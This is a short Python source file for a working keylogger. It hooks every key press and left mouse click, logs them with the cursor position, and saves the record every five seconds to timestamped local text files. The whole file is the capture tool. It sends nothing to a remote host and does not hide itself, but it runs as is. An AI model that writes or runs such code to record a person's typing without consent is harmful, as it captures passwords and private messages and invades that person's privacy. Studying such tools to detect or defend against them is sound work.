# -*- coding: utf-8 -*-
import keyboard
import mouse
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.end_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")

    def keyboard_callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def mouse_callback(self):
        self.log += f"[L_CLICK, {mouse.get_position()}]"
    
    def write_to_file(self):
        filename = f"keylog-{self.start_time_str}_{self.end_time_str}"

        with open(f"{filename}.txt", "w", encoding="utf-8") as file:
            file.write(self.log)
        print(f"Saved {filename}.txt")

    def report(self):
        if self.log:
            self.end_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
            self.write_to_file()
            self.start_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_callback)
        self.report()

        print("Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=5)
    keylogger.start()